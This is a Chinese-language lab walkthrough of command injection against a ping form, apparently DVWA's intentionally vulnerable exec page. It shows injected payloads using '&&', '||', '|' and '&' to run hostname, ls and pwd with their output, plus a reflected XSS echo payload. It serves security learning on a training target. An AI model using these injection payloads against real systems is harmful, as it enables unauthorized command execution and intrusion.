# Command Injection

加上 `;` 這招無效了，只好試試其他方式

假設他有做一些過濾，會移除掉一些符號，那麼如何利用合法的方式讓它執行我想要的指令 ?

```bash
8.8.8.8 && 1.1.1.1
```
```
PING 8.8.8.8 (8.8.8.8): 56 data bytes
64 bytes from 8.8.8.8: icmp_seq=0 ttl=37 time=35.184 ms
64 bytes from 8.8.8.8: icmp_seq=1 ttl=37 time=9.613 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=37 time=29.270 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=37 time=80.921 ms
--- 8.8.8.8 ping statistics ---
4 packets transmitted, 4 packets received, 0% packet loss
round-trip min/avg/max/stddev = 9.613/38.747/80.921/26.124 ms
PING 1.1.1.1 (1.1.1.1): 56 data bytes
64 bytes from 1.1.1.1: icmp_seq=0 ttl=37 time=8.295 ms
64 bytes from 1.1.1.1: icmp_seq=1 ttl=37 time=48.083 ms
64 bytes from 1.1.1.1: icmp_seq=2 ttl=37 time=86.008 ms
64 bytes from 1.1.1.1: icmp_seq=3 ttl=37 time=8.431 ms
--- 1.1.1.1 ping statistics ---
4 packets transmitted, 4 packets received, 0% packet loss
round-trip min/avg/max/stddev = 8.295/37.704/86.008/32.260 ms
```
看起來可行

沒有過濾 `&&` 那應該可以進一步試試

```bash
&& 1.1.1.1
```
```
PING 1.1.1.1 (1.1.1.1): 56 data bytes
64 bytes from 1.1.1.1: icmp_seq=0 ttl=37 time=18.062 ms
64 bytes from 1.1.1.1: icmp_seq=1 ttl=37 time=8.199 ms
64 bytes from 1.1.1.1: icmp_seq=2 ttl=37 time=22.774 ms
64 bytes from 1.1.1.1: icmp_seq=3 ttl=37 time=11.311 ms
--- 1.1.1.1 ping statistics ---
4 packets transmitted, 4 packets received, 0% packet loss
round-trip min/avg/max/stddev = 8.199/15.087/22.774/5.693 ms
```

```
PING 1.1.1.1 (1.1.1.1): 56 data bytes
64 bytes from 1.1.1.1: icmp_seq=0 ttl=37 time=9.902 ms
64 bytes from 1.1.1.1: icmp_seq=1 ttl=37 time=10.778 ms
64 bytes from 1.1.1.1: icmp_seq=2 ttl=37 time=10.773 ms
64 bytes from 1.1.1.1: icmp_seq=3 ttl=37 time=10.117 ms
--- 1.1.1.1 ping statistics ---
4 packets transmitted, 4 packets received, 0% packet loss
round-trip min/avg/max/stddev = 9.902/10.393/10.778/0.390 ms
```

失敗

```bash
1.1.1.1 && ls
```

### Done

多試幾次後，運氣好猜中， `||` , `|`, `&`

### or
```bash
||hostname
# 91ab8a5e75e3
```

### pipline
```bash
|ls
#help
#index.php
#source
```

### background job
```bash
&pwd 
#/var/www/html/vulnerabilities/exec
```

### XSS
這邊有 client side reflected XSS
```html
&echo "<script>alert(1)</script>"
```

![這邊有 client side reflected XSS](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/fca5ac85-25c8-4d6b-b0f8-95ac06a1af23/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220215%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220215T042730Z&X-Amz-Expires=86400&X-Amz-Signature=44e621fb82de0d9e1edcc24e61f12cef66919f6128713cf7ac85a4ac61106ebc&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

